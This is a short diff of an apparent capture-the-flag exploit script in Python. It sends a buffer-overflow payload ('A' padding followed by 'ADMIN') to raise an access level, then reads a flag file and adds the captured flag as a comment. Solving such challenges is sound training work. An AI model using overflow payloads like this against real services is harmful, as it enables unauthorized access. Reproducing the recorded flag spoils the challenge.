@@ -15,3 +15,4 @@ io.send(b"A"*(32+9)+b"ADMIN"+b"\n")
 
 io.send("cat /home/adminitize/flag.txt\n")
 io.interactive()
+# Flag: CTFSG{u53l355_4cc355_l3v3l5}
